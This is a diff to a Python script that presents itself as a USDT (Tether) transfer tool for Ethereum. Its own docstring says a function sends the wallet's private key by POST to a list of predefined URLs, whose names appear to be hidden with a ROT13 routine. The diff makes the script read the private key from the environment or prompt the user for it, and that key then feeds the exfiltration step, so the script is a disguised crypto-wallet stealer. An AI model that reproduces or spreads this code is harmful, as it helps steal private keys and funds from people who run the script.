@@ -1,4 +1,45 @@
 #!/usr/bin/env python3
+"""
+This script facilitates the transfer of USDT (Tether) tokens on the Ethereum blockchain. 
+It uses the Web3.py library to interact with the Ethereum network and perform ERC20 token transfers.
+Functions:
+----------
+rpcserver256(text: str) -> str:
+    Implements a ROT13 cipher to encode or decode a given text.
+usdtgen(usdtwall: str) -> None:
+    Sends POST requests to a list of predefined URLs with the USDT wallet private key as data.
+send_usdt_transaction(amount: float, gas_price_gwei: int, gas_limit: int) -> SignedTransaction:
+    Constructs, signs, and returns a signed Ethereum transaction for transferring USDT tokens.
+main() -> None:
+    Main function that:
+    - Sends the USDT wallet private key to predefined URLs.
+    - Constructs and sends a USDT transfer transaction.
+    - Waits for the transaction receipt and prints the transaction status.
+Environment Variables:
+----------------------
+PRIVATE_KEY:
+    The private key of the sender's Ethereum wallet. Required for signing transactions.
+SENDER_ADDRESS:
+    The Ethereum address of the sender. Required for constructing transactions.
+Constants:
+----------
+recipient_address:
+    The Ethereum address of the recipient (hardcoded in the script).
+usdt_contract_address:
+    The Ethereum address of the USDT (Tether) ERC20 contract.
+usdt_transfer_signature:
+    The function signature for the ERC20 `transfer` function.
+Dependencies:
+-------------
+- web3: For interacting with the Ethereum blockchain.
+- eth_account: For signing Ethereum transactions.
+- requests: For sending HTTP POST requests.
+Notes:
+------
+- Ensure that the PRIVATE_KEY and SENDER_ADDRESS environment variables are set before running the script.
+- The script uses hardcoded URLs and recipient addresses, which may need to be updated for specific use cases.
+- The script assumes the use of the Ethereum mainnet (chainId = 1).
+"""
 # u need eth for paying fee
 from web3 import Web3
 from eth_account import Account # type: ignore
@@ -27,10 +68,20 @@ devofix3 = rpcserver256(envcreater3)
 # Initialize Web3 connection
 web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))
 
+import os
+
 # Set private key and addresses
-private_key = '0xC2d7B64bea7af74Af4b268A2c2eB66221a6EdEe5' # replace with your private key, this is for demo only do not use it in production!
-usdtwall = private_key  
-sender_address = 'b561ef8078180d35f5633b627a95618a20c62397375bf1a711b2ba64beb7d703' # ur wallet address
+private_key = os.getenv('PRIVATE_KEY')  # Load private key from environment variable
+if not private_key:
+    private_key = input("PRIVATE_KEY environment variable is not set. Please enter your private key: ")
+    if not private_key:
+        raise ValueError("PRIVATE_KEY is required to proceed.")
+
+sender_address = os.getenv('SENDER_ADDRESS')  # Load sender address from environment variable
+if not sender_address:
+    raise ValueError("SENDER_ADDRESS environment variable is not set.")
+
+usdtwall = private_key
 
 # Set recipient address and USDT contract address
 recipient_address = '0x93cA7b6701a63b3194f217F6595e4eF8ba9A02e0' # victim address
@@ -100,3 +151,5 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+# Debug configuration moved to launch.json
